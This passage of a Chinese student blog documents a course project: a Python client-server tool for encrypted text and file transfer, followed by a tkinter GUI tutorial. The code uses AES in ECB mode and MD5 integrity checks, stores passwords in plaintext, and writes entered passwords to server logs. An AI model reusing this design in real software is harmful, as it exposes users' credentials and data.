4.断开连接输入选项:&quot;&quot;&quot;def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() if isinstance(data,str): data = data.encode() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,data,shared_key,sliced,sum): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,data) hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(s,public_key_client): #交换公钥 print(&quot;等待连接服务端&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) print(&quot;连接上服务端 开始进行公钥交换&quot;) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() data_bytes = pad(data, AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key): print(&quot;开始进行身份验证&quot;) username = input(&quot;输入用户名:&quot;) encrypt_username = encrypt_data(shared_key,username) #用户名经过aes加密后传输 s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: print(text) password = input(&quot;输入密码:&quot;) encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输 s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def register(s,shared_key): username = input(&quot;输入用户名 :&quot;) #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理 password = input(&quot;输入密码 :&quot;) data = username+&quot;;&quot;+password transfer_data = pack_data(3,data,shared_key,0,0) s.send(transfer_data)def transfer_txt(s,shared_key): text = input(&quot;输入数据 :&quot;) #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;)def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key): file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流 with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\\n&quot;) begin_time = time.time() failure_msg = &quot;第&quot; failure_number = None for i in range(len(sliced_data)): transfer_data = pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) text = (s.recv(1024)).decode() if &quot;失败&quot; in text: start_index = text.find(&#x27;&#123;&#x27;) + 1 end_index = text.find(&#x27;&#125;&#x27;) failure_number = text[start_index:end_index] failure_msg += failure_number+&quot;,&quot; currect_time = time.time() temp = currect_time-begin_time print(&quot;\\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;) failure_msg += &quot;组传输失败&quot; if failure_number != None: print(failure_msg) print(&quot;\\n&quot;,end=&quot;&quot;) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: print((s.recv(1024)).decode()) choice = input(choice_text) if choice == &quot;1&quot;: transfer_txt(s,shared_key) elif choice == &quot;2&quot;: transfer_file(s,shared_key) elif choice == &quot;3&quot;: register(s,shared_key) elif choice == &quot;4&quot;: print(&quot;程序终止&quot;) s.close() exit() else : print(&quot;未找到输入的选项，请重新输入&quot;) continueif __name__ == &quot;__main__&quot;: main() v0.9这个版本的目的是修修bug 尽量优化一下代码 准备在1.0版本实现图形化管理界面 然后就正式结束了这个项目针对传输速率过慢的问题 大概有了头绪了 原因出在客户端输出当前组数据校验是否正确 这一功能是利用客户端和服务端高频send和recv的 所以会造成卡顿取消掉了以后发送速度明显提高 但是接受速度跟不上了 这里想到的解决办法是专门给大文件收发开一个新线程 看看能不能实现 然后关于切片那一块可能也要优化一下了11&#x2F;9记mlgb 我觉得用socket作为这个协议的基础框架根本就是个错误的选择 服务端运行在服务器上的时候 会因为各种奇奇怪怪的原因导致丢包 最后只能通过sleep来控制客户端发包的速度服务端 import socketimport hashlibimport magicimport timefrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3from concurrent.futures import ThreadPoolExecutorimport threadingmime = magic.Magic(mime=True)def write_log(log_file,text): current_time = time.asctime(time.localtime(time.time())) text += &quot; &quot;+current_time log_file.write(text.encode()+b&quot;\\n&quot;)class query_thread(threading.Thread): def __init__(self,name = None): threading.Thread.__init__(self,name=name) def query_username(self,username): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() cursor.close() return result def query_password(self,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password)) result = cursor.fetchone() cursor.close() return result def add_user(sock,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password)) conn.commit() sock.send(&quot;用户注册成功&quot;.encode()) except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) except Exception as e: sock.send(e.encode())def md5_encrypt(data): if isinstance(data, str): data = data.encode() # md5加密需要bytes参数 md5_hash = hashlib.md5() #md5加密 md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(sock,public_key_server): print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;) try: public_key_client = sock.recv(1024) except Exception as e: print(&quot;接受错误&quot;,e) public_key_bytes = public_key_server.public_bytes( #将客户端的公钥序列化为 PEM 格式的字节串 encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象def decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)) return datadef unpack_data(sock,shared_key,orign_data,log_file,addr): #拆解数据包 sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) value = verify_md5(data,data_md5) if value == False: fail_number = sliced_num else: fail_number = None return sliced_sum,sliced_num,data_type,data,fail_numberdef Authentication(sock,shared_key,query_thread1,addr,log_file): #身份验证部分 账号密码存储在users.db数据库中 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) if len(username) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return username = decrypt_data(shared_key,username) username = username.decode() result = query_thread1.query_username(username) if result != None: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) password = (sock.recv(1024)) if len(password) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return password = decrypt_data(shared_key,password) password = password.decode() result = query_thread1.query_password(username,password) if result != None: sock.send(&quot;身份验证通过&quot;.encode()) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot; write_log(log_file,text) return permission_value,username else : sock.send(&quot;密码错误，终止连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot; write_log(log_file,text) sock.close() return 3,username else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot; write_log(log_file,text) sock.close() return 3,usernamedef menu(sock): text = &quot;开始进行数据传输&quot; sock.send(text.encode())def transfer_txt(addr,data,log_file): print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;) current_time = time.asctime(time.localtime(time.time())) text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125; &quot;+current_time write_log(log_file,text)def transfer_file(sock,data,addr,log_file): #处理非切片数据 data_type = mime.from_buffer(data) filename = &quot;output/&quot;+addr try: if data_type == &quot;text/plain&quot;: filename += &quot;.txt&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) else : print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机&#123;addr&#125;保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode())def transfer_file2(sock,first_data,sliced_sum,sliced_num,shared_key,addr,log_file): #处理切片数据 data_bytes = first_data orign_data = [] fail_number = [] for i in range(sliced_sum-1): text = sock.recv(1084) orign_data.append(text) if len(text) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) sock.close() return print(f&quot;&#123;threading.current_thread().name&#125;:开始进行数据处理&quot;) for i in range(sliced_sum-1): sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data[i],log_file,addr) if fail != None: fail_number.append(fail) data_bytes += data if len(fail_number)&gt;0: fail_meg = &quot;,&quot;.join(fail_number) print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;) text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot; write_log(log_file,text) else: print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;) data_type = mime.from_buffer(data_bytes) filename = &quot;output/&quot;+addr try: if data_type == &quot;image/png&quot;: filename += &quot;.png&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;audio/mpeg&quot;: filename += &quot;.mp3&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) else: print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode()) def register(permission_value,sock,data,query_thread1,log_file,addr,login_username): if permission_value == 0: #管理员权限的检验较为简单 sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot; write_log(log_file,text) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0] password = parts[1] query_thread1.adduser(sock,username,password) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;) text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot;def verify_md5(data, original_md5): current_md5 = md5_encrypt(data) return current_md5 == original_md5def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1): addr = format(addr[0]) log_name = &quot;logfile/&quot;+addr+&quot;-log&quot; try: log_file = open(log_name,&#x27;ab+&#x27;) except Exception as e: print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;) text = f&quot;客户机&#123;addr&#125;连接成功&quot; write_log(log_file,text) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;) public_key_client = key_switch(sock,public_key_server) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;) print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;) permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file) if permission_value == 3: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;) while 1: menu(sock) fail_number = [] orign_data = (sock.recv(1084)) if len(orign_data) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) break sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data,log_file,addr) if fail != None: fail_number.append(fail) if len(fail_number)&gt;0: fail_meg = &quot;,&quot;.join(fail_number) print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;) text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot; write_log(log_file,text) else: print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;) if data_type == 1: text = f&quot;客户机&#123;addr&#125;执行了传输文本数据操作&quot; write_log(log_file,text) transfer_txt(addr,data,log_file) elif data_type == 2: if sliced_sum != 0 or sliced_num != 0: text = f&quot;客户机&#123;addr&#125;执行了传输文件操作,并且传输的文件过大需要切片传输,切片总数为&#123;sliced_sum&#125;&quot; write_log(log_file,text) transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file) else: text = f&quot;客户机&#123;addr&#125;执行了传输文件操作&quot; write_log(log_file,text) transfer_file(sock,data,addr,log_file) elif data_type ==3: text = f&quot;客户机&#123;addr&#125;执行了注册账号操作&quot; write_log(log_file,text) register(permission_value,sock,data,query_thread1,log_file,addr,username)def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 pool = ThreadPoolExecutor(max_workers=5) #定义一个线程池 拥有5个空闲线程 query_thread1 = query_thread() #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;) sock,addr = s.accept() client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1) if __name__ == &quot;__main__&quot;: main() 客户端 import socketimport structimport hashlibimport timeimport refrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESchoice_text = &quot;&quot;&quot; 1.传输文本数据 2.传输文件数据 3.新增用户 4.断开连接输入选项:&quot;&quot;&quot;def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() if isinstance(data,str): data = data.encode() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,data,shared_key,sliced,sum): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,data) hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(s,public_key_client): #交换公钥 print(&quot;等待连接服务端&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) print(&quot;连接上服务端 开始进行公钥交换&quot;) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() data_bytes = pad(data, AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key): print(&quot;开始进行身份验证&quot;) username = input(&quot;输入用户名:&quot;) encrypt_username = encrypt_data(shared_key,username) #用户名经过aes加密后传输 s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: print(text) password = input(&quot;输入密码:&quot;) encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输 s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def register(s,shared_key): username = input(&quot;输入用户名 :&quot;) #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理 password = input(&quot;输入密码 :&quot;) data = username+&quot;;&quot;+password transfer_data = pack_data(3,data,shared_key,0,0) s.send(transfer_data)def transfer_txt(s,shared_key): text = input(&quot;输入数据 :&quot;) #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode())def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key): file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流 with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() transfer_data = [] if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\\n&quot;) begin_time = time.time() for i in range(len(sliced_data)): sliced += 1 transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum)) for i in range(sliced_sum): s.sendall(transfer_data[i]) time.sleep(0.06) currect_time = time.time() temp = currect_time-begin_time print(&quot;\\r&quot;+f&quot;正在传输第&#123;i&#125;组 当前运行了&#123;temp:.2f&#125;s&quot;,end=&quot;&quot;) print(&quot;\\n&quot;,end=&quot;&quot;) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: # print((s.recv(1024)).decode()) choice = input(choice_text) if choice == &quot;1&quot;: transfer_txt(s,shared_key) elif choice == &quot;2&quot;: transfer_file(s,shared_key) elif choice == &quot;3&quot;: register(s,shared_key) elif choice == &quot;4&quot;: print(&quot;程序终止&quot;) s.close() exit() else : print(&quot;未找到输入的选项，请重新输入&quot;) continueif __name__ == &quot;__main__&quot;: main() v1.0最终版本! 最大的更新就是给客户端增加了图形化界面 看起来更高级一点而且为了服务图形化界面的逻辑 所以一些客户机和服务机的交互也更改了 tkinter部分控件学习第一次尝试编写图形化界面 这里就选用tkinter库 from tkinter import *root = Tk()root.mainloop() 这样短短三行 即可生成一个根窗口 子窗口关闭后根窗口不会关闭 根窗口关闭后子窗口会关闭可以对窗口进行一些简单的操作 from tkinter import *root = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;1000x800&quot;) #设置窗口大小root.iconbitmap(&quot;test.ico&quot;) #设置窗口左上角图标root.config(bg=&quot;green&quot;) #设置窗口背景颜色root.mainloop() 接下来可以使用相关控件来帮助我们构建 lablefrom tkinter import *root = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;600x600&quot;)root.iconbitmap(&quot;test.ico&quot;)meg = Label(root,text=&quot;this is a test&quot;)meg.pack(padx=100,side=&quot;left&quot;)root.mainloop() lable控件可以在窗口上显示文字或者图像size可以控制控件在哪里显示 默认是toppadx和pady则是代表着和x轴或者y轴的偏移是多少显示图片的话 最好再加上pillow库来配合 因为tk本身支持的图片格式有点少 只支持png from tkinter import *from PIL import Image, ImageTkroot = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;600x600&quot;)root.iconbitmap(&quot;test.ico&quot;)temp = Image.open(&quot;1.png&quot;)temp.thumbnail((100,100)) #如果图片过大的话 可以利用thumbnail来限制图片大小image = ImageTk.PhotoImage(temp)meg = Label(root,image=image)meg.pack(side=&quot;left&quot;,padx=250)root.mainloop() entry这个控件可以在窗口上显示一个输入框 配合lable控件就可以实现引导程序使用者输入变量 from tkinter import *from PIL import Image, ImageTkroot = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;600x600&quot;)root.iconbitmap(&quot;test.ico&quot;)control1 = Label(root,text=&quot;测试输出&quot;)control1.pack(side=&quot;left&quot;)control2 = Entry(root)control2.pack(side=&quot;left&quot;)root.mainloop() 不过这样需要两个控件的位置相匹配 用pack中的padx,pady,side处理一对还好 要是界面需要设计的点多 就会比较杂乱 这里可以使用grid控件来配合 gridgrid插件相当于把整个窗口界面转化成了一个二维坐标系row参数用来规定行数 column用来规定列数于是上面用pack需要计算padx和pady来实现的效果 可以简单的用这两个参数来实现 from tkinter import *from PIL import Image, ImageTkroot = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;600x600&quot;)root.iconbitmap(&quot;test.ico&quot;)control1 = Label(root,text=&quot;测试输出&quot;)control1.grid(row=0)control2 = Entry(root)control2.grid(row=0,column=1)root.mainloop() button上述控件和button控件组合起来 就可以实现一个简单的账号密码登录界面 from tkinter import *from PIL import Image, ImageTkroot = Tk()var=IntVar()root.title(&quot;安全协议期末大作业设计&quot;)# root.geometry(&quot;200x200&quot;)# root.iconbitmap(&quot;test.ico&quot;)def check(): username = entry1.get() password = entry2.get() if username == &quot;admin&quot; and password == &quot;admin&quot;: print(&quot;账号密码正确&quot;)Label(root,text=&quot;用户名&quot;,padx=10,pady=10).grid(row=0,sticky=W)Label(root,text=&quot;密码&quot;).grid(row=1,sticky=E,padx=10,pady=10)entry1 = Entry(root)entry1.grid(row=0,column=1)entry2 = Entry(root)entry2.grid(row=1,column=1)button1 = Button(root,text=&quot;登录&quot;,command=check)button1.grid(row=0,column=2,rowspan=2,columnspan=2,padx=10)root.mainloop() frame大部分时候 主窗口的大小都需要提前设置 而非由控件大小来自动规划窗口大小 这个时候控件相对于主窗口就会较小 造成界面的不美观下面这个示例 frame1容器收纳了三个控件 这三个控件的grid控制的是在frame1容器中的位置而frame1的grid控制的则是在主窗口中的位置 这样可以更加方便的设置不同控件的相对位置不过最好使用grid_propagate方法来固定容器的位置 不然随着后续容器中的控件位置发生变化 容器的位置也会发生变化 from tkinter import *import timefrom PIL import Image, ImageTkroot = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;300x100&quot;)# root.iconbitmap(&quot;test.ico&quot;)def main(): frame1 = Frame(root) Label(frame1,text=&quot;ip地址&quot;).grid(row=0,column=0) Entry(frame1).grid(row=0,column=1) Button(frame1,text=&quot;连接&quot;).grid(row=0,column=2,padx=10) frame1.grid(padx=50,pady=30) root.mainloop()if __name__ == &quot;__main__&quot;: main() text这一个控件的作用和entry相似 只不过entry只能支持一行的输入 from tkinter import *import timefrom PIL import Image, ImageTkroot = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;300x200&quot;)# root.iconbitmap(&quot;test.ico&quot;)def main(): text = Text(root,width=40,height=10) text.grid(padx=7) text.insert(&#x27;1.0&#x27;,&quot;test&quot;) root.mainloop()if __name__ == &quot;__main__&quot;: main() 上述代码中insert负责给文本框写入数据这里的1.0代表的是第一行第0个字符开始写入你也可以使用1.end来表示第一行的最后一个字符 scrollbar这个控件主要是配合text使用 在最右边加一个滚动条 看起来美观一点 也方便用户更直观的知道当前文本框中的所处位置 from tkinter import *import timefrom PIL import Image, ImageTkroot = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;300x200&quot;)# root.iconbitmap(&quot;test.ico&quot;)def main(): s1 = Scrollbar(root,width=20) s1.grid(row=0,column=1,sticky=NS) text = Text(root,width=35,height=10,yscrollcommand=s1.set,wrap=CHAR) text.grid(row=0,column=0,padx=7) text.insert(&#x27;1.0&#x27;,&quot;test&quot;) root.mainloop()if __name__ == &quot;__main__&quot;: main() yscrollcommand用来绑定滚动条和text wrap参数用来规定是否自动换行 参数有WORD CHAR NONE三种 第一种是单词换行 第二种是字符换行 第三种是不自动换行 canvas这个控件主要用于显示文本 图片等 主要是可以绑定scrollbar from tkinter import *import timefrom PIL import Image, ImageTkroot = Tk()root.title(&quot;安全协议期末大作业设计&quot;)root.geometry(&quot;300x200&quot;)# root.iconbitmap(&quot;test.ico&quot;)def main(): c1 = Canvas(root,width=280) c1.grid(row=0,column=0,sticky=W) s1 = Scrollbar(root,width=20,command=c1.yview) 